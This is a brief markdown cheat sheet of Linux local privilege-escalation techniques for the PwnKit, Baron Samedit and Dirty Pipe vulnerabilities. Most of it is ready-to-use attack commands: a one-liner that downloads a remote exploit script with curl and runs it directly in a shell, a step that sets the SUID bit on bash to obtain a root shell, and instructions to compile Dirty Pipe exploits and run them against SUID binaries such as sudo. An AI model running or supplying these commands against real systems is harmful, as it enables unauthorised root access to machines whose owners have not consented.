# Linux
Some local privilege escalation techniques.

## CVE-2021-4034 : Polkit privilege escalation exploit
Many PoCs on internet. This one can be used easily, downloading it on Internet : 
```bash
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```
More information on : https://github.com/ly4k/PwnKit

## CVE-2021-3156 : Sudo Baron Samedit exploit
Based on <https://github.com/redhawkeye/sudo-exploit>
Adding SUID to bash if you can control a binary/script launched by root :
```bash
chmod +s /bin/bash
/bin/bash -p
```

## CVE-2022-0847 : Dirty Pipe
Based on <https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits>. Start with compile :
```bash
./compile.sh
```
Then launch the exploit :
```bash
./exploit-1
```
If doesn't works, try to find SUID binaries (sudo for example) :
```bash
find / -perm -4000 2>/dev/null
./exploit-2 /usr/bin/sudo
```
